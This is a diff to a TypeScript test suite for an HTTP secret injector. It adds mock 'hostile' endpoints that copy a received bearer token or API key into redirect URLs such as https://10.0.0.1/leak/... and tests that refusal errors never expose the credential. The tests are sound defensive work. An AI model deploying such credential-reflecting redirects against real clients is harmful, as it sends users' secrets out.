@@ -72,6 +72,35 @@ beforeAll(async () => {
       return;
     }
 
+    // Hostile endpoint: reflects the credential it just received back into the
+    // Location header of a hop it knows the vault will refuse (H2).
+    if (url.pathname === "/redirect-echo-credential") {
+      const auth = String(req.headers["authorization"] ?? "").replace(/^Bearer\s+/i, "");
+      const custom = String(req.headers["x-api-key"] ?? "");
+      const stolen = auth || custom || url.searchParams.get("api_key") || "nothing";
+      res.writeHead(302, { Location: `https://10.0.0.1/leak/${encodeURIComponent(stolen)}` });
+      res.end();
+      return;
+    }
+
+    // Reflects the credential into the *hostname* of the refused hop, where
+    // reporting the origin alone does not remove it — only redaction does.
+    if (url.pathname === "/redirect-echo-credential-host") {
+      const auth = String(req.headers["authorization"] ?? "").replace(/^Bearer\s+/i, "");
+      res.writeHead(302, { Location: `https://${auth.toLowerCase()}.invalid/` });
+      res.end();
+      return;
+    }
+
+    // Same, but the refused hop is a non-allowlisted public host rather than a
+    // private one — exercises the url_allowlist branch.
+    if (url.pathname === "/redirect-echo-credential-allowlist") {
+      const auth = String(req.headers["authorization"] ?? "").replace(/^Bearer\s+/i, "");
+      res.writeHead(302, { Location: `https://8.8.8.8/leak/${encodeURIComponent(auth)}` });
+      res.end();
+      return;
+    }
+
     if (url.pathname === "/slow") {
       // Don't respond — simulate timeout
       return;
@@ -199,6 +228,114 @@ describe("HttpInjector", () => {
       ).rejects.toMatchObject({ code: ErrorCode.REDIRECT_POLICY_VIOLATION });
       // Only the redirecting response itself was fetched — the private hop never executed.
       expect(requestPaths.slice(before)).toEqual(["/redirect-private"]);
+    });
+
+    // H2: the refused hop is authored by the endpoint that just received the
+    // credential, so its URL must never reach the thrown message — that message
+    // becomes the MCP tool result text and the REST error body.
+    describe("refusal messages never carry the credential (H2)", () => {
+      const CREDENTIAL = "sk-live-h2-9f3a2b7c1d4e5f60";
+
+      it("bearer: SSRF-refused hop reflecting the token", async () => {
+        const err = await injector
+          .executeWithSecret(
+            { method: "GET", url: `${baseUrl}/redirect-echo-credential` },
+            new Uint8Array(Buffer.from(CREDENTIAL)),
+            { type: "bearer" },
+            "any",
+          )
+          .catch((e: unknown) => e as Error);
+        expect(err).toMatchObject({ code: ErrorCode.REDIRECT_POLICY_VIOLATION });
+        expect(err.message).not.toContain(CREDENTIAL);
+        expect(err.message).not.toContain(encodeURIComponent(CREDENTIAL));
+      });
+
+      it("header injection: SSRF-refused hop reflecting the header value", async () => {
+        const err = await injector
+          .executeWithSecret(
+            { method: "GET", url: `${baseUrl}/redirect-echo-credential` },
+            new Uint8Array(Buffer.from(CREDENTIAL)),
+            { type: "header", header_name: "X-Api-Key" },
+            "any",
+          )
+          .catch((e: unknown) => e as Error);
+        expect(err.message).not.toContain(CREDENTIAL);
+      });
+
+      it("allowlist-refused hop reflecting the token", async () => {
+        const err = await injector
+          .executeWithSecret(
+            {
+              method: "GET",
+              url: `${baseUrl}/redirect-echo-credential-allowlist`,
+              urlAllowlist: [`${baseUrl}/*`],
+            },
+            new Uint8Array(Buffer.from(CREDENTIAL)),
+            { type: "bearer" },
+            "any",
+          )
+          .catch((e: unknown) => e as Error);
+        expect(err).toMatchObject({ code: ErrorCode.URL_NOT_ALLOWED });
+        expect(err.message).not.toContain(CREDENTIAL);
+      });
+
+      it("status_only does not help — the leak was on the throw path", async () => {
+        const err = await injector
+          .executeWithSecret(
+            {
+              method: "GET",
+              url: `${baseUrl}/redirect-echo-credential`,
+              responseMode: "status_only",
+            },
+            new Uint8Array(Buffer.from(CREDENTIAL)),
+            { type: "bearer" },
+            "any",
+          )
+          .catch((e: unknown) => e as Error);
+        expect(err.message).not.toContain(CREDENTIAL);
+      });
+
+      // Pins guard 1 (origin only, never the full URL) independently of the
+      // redaction backstop: with the whole URL interpolated the path survives
+      // even though the credential inside it would be redacted.
+      it("reports the origin without the endpoint-authored path", async () => {
+        const err = await injector
+          .executeWithSecret(
+            { method: "GET", url: `${baseUrl}/redirect-echo-credential` },
+            new Uint8Array(Buffer.from(CREDENTIAL)),
+            { type: "bearer" },
+            "any",
+          )
+          .catch((e: unknown) => e as Error);
+        expect(err.message).not.toContain("/leak/");
+      });
+
+      // Pins guard 2 (the redaction backstop) independently of guard 1: a
+      // credential reflected into the hostname is part of the origin itself.
+      it("redacts a credential reflected into the refused hop's hostname", async () => {
+        const lower = CREDENTIAL.toLowerCase();
+        const err = await injector
+          .executeWithSecret(
+            { method: "GET", url: `${baseUrl}/redirect-echo-credential-host` },
+            new Uint8Array(Buffer.from(lower)),
+            { type: "bearer" },
+            "any",
+          )
+          .catch((e: unknown) => e as Error);
+        expect(err.message).not.toContain(lower);
+      });
+
+      it("still names the refused origin, so the refusal stays diagnosable", async () => {
+        const err = await injector
+          .executeWithSecret(
+            { method: "GET", url: `${baseUrl}/redirect-private` },
+            new Uint8Array(Buffer.from(CREDENTIAL)),
+            { type: "bearer" },
+            "any",
+          )
+          .catch((e: unknown) => e as Error);
+        expect(err.message).toContain("https://10.0.0.1");
+      });
     });
   });
 
